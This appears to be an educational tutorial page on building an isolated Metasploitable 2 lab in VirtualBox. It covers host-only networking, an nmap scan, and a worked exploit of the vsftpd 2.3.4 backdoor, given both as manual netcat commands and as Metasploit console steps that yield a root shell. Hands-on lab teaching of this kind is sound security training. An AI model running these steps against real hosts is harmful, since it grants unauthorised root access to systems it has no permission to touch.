---
title: Metasploitable VM Setup
description: Set up Metasploitable 2 in VirtualBox as an isolated, legal hacking lab. Step-by-step VM install, safe host-only networking, and your first Nmap scan.
layout: ../../layouts/MainLayout.astro
---

You cannot learn offensive security by reading alone, and you must never practise on systems you do not own or lack written permission to test. The professional answer is to build a deliberately vulnerable machine and attack it inside a sealed lab.

**Metasploitable 2** is a Linux [Virtual Machine](/en/page-3) published by Rapid7, the team behind the [Metasploit Framework](/en/page-6). It ships with weak services, default credentials, and unpatched software on purpose, which makes it an ideal, legal target for practising [Port Scanning](/en/page-port-scanning), enumeration, exploitation, and gaining [Root Access](/en/page-root-access). This guide gets it running in VirtualBox and, critically, keeps it off the open internet.

## What You Will Need

1. **VirtualBox** — download and install [Oracle VirtualBox](https://www.virtualbox.org/wiki/Downloads) for your host operating system.
2. **The Metasploitable 2 image** — grab the VM from Rapid7: [Download Metasploitable 2](https://information.rapid7.com/download-metasploitable-2017-thanks.html).

A short registration form usually stands between you and the download button, then you receive the ZIP archive.

![Website download](/en/images/metasploitable-website.png)

## Step 1: Extract the Disk Image

Find the archive (`metasploitable-linux-2.0.0.zip`) in your Downloads folder and extract it. Inside the extracted folder, locate **`Metasploitable.vmdk`** — this Virtual Machine Disk file is the pre-built hard drive for the VM, so there is no operating system to install.

![File in folder](/en/images/metasploitable-file-in-folder.png)

## Step 2: Create the Virtual Machine

Open VirtualBox and build a shell that boots from the existing disk.

1. Click **New** in the VirtualBox toolbar.
   ![New VM](/en/images/click-new-vm.png)

2. Set the name and operating system:
   - **Name:** `Metasploitable 2`
   - **Type:** `Linux`
   - **Version:** `Ubuntu (32-bit)` — Metasploitable 2 is a 32-bit image, so do not pick the 64-bit profile.

   ![Name and choosing](/en/images/naming-and-choosing.png)

3. **Memory:** 512 MB is enough, and 1024 MB (1 GB) is comfortable. Metasploitable runs entirely from the [Linux Shell](/en/page-linux-shell) with no desktop, so it needs very little.

4. **Hard disk:** choose **Use an existing virtual hard disk file** instead of creating a new one. Click the yellow folder icon.
   ![Yellow Folder icon](/en/images/folder-icon.png)

   Click **Add**, browse to the folder from Step 1, and select **`Metasploitable.vmdk`**. Confirm, then click **Create**.
   ![Find mvdk file](/en/images/find-vmdk.png)

## Step 3: Isolate the Network (Do Not Skip)

Metasploitable is trivial to compromise, so exposing it to the internet turns your lab into a genuine liability, potentially a foothold for real attackers on your LAN.

1. Right-click the VM and choose **Settings**.
2. Open the **Network** tab.
3. Change **Attached to** from _NAT_ to **Host-only Adapter**.

Host-only networking lets the VM talk to your host and to other VMs on the same adapter — such as your Kali Linux attacker — but nothing else. If you want several lab machines to reach each other without touching the host, use **Internal Network** instead. Either way, the target stays quarantined. For the bigger picture, see [Networking](/en/page-networking).

## Step 4: Boot and Log In

Select the VM and click the green **Start** arrow. Watch the boot messages scroll past, then log in at the console:

- **Username:** `msfadmin`
- **Password:** `msfadmin`

These deliberately weak default credentials are exactly the kind of finding you will learn to hunt for. Find the machine's [IP Address](/en/page-ip) so your attacker can reach it:

```bash
ip a
# or, since Metasploitable ships net-tools:
ifconfig
```

## Step 5: Confirm the Target from Kali

Switch to your attacker machine and verify the two VMs can see each other. Point [Nmap](/en/page-4) at the Metasploitable IP (replace with the address you found):

```bash
# Service and version detection across common ports
nmap -sV 192.168.56.101
```

You should see a long list of open, outdated services — FTP, SSH, Telnet, an old Apache, MySQL, and more. Each one is a lesson in enumeration and exploitation. From here you can move into the [Metasploit Framework](/en/page-6) proper; the [Metasploit Video Examples](/en/page-metasploitVideoExample) walk through attacking this exact box.

## Hands-on Lab: Exploit the vsftpd 2.3.4 Backdoor

Your scan flagged `vsftpd 2.3.4` on port 21, and that exact version carries a real [Backdoor](/en/page-backdoor). In 2011 an attacker replaced the source tarball on a vsftpd download mirror with a tampered copy: any FTP username ending in `:)` silently opens a shell listening on port 6200. Metasploitable preserves the flaw, so it makes a clean first exploit — and a good one for seeing exactly what a module does under the hood.

**Do it the manual way first**, so the automation isn't magic. Trigger the backdoor by hand:

```bash
# Terminal 1 — send a username ending in a smiley, then any password
nc 192.168.56.101 21
USER pentest:)
PASS whatever
```

The connection appears to hang. That is the point — the smiley spawned a root shell on another port:

```bash
# Terminal 2 — connect to the shell the backdoor just opened
nc 192.168.56.101 6200
id
whoami
```

You land as `uid=0(root)` with full [Root Access](/en/page-root-access), no password cracking required.

**Now let Metasploit handle it.** Close both shells and open the console on Kali:

```bash
msfconsole -q
```

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > check
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

`check` reads the FTP banner to confirm the version before you fire; `run` sends the smiley login and drops you into a command shell session. Type `id` to confirm root, press Ctrl-Z to background it, then `sessions -l` to see it listed and ready for post-exploitation.

Compare the two paths: the module did nothing you couldn't do with `nc` — it just scripted the handshake and managed the session for you. Knowing exactly what the automation does under the hood is what lets you adapt or debug an exploit when a real target doesn't behave like the lab.

## Where to Go Next

Metasploitable 2 is the classic starting point, but it is not the only one. **Metasploitable 3** adds Windows and Linux targets you build with automation tools, and it models more modern flaws. Deliberately vulnerable web apps such as DVWA and OWASP Juice Shop pair well with a proxy like [Burp Suite](/en/page-burp-suite) when you shift toward [Web Hacking](/en/page-web-hacking). Whatever you attack, keep it inside the lab, and keep every technique tied to a real [Vulnerability](/en/page-vulnerability) you understand rather than a button you clicked.
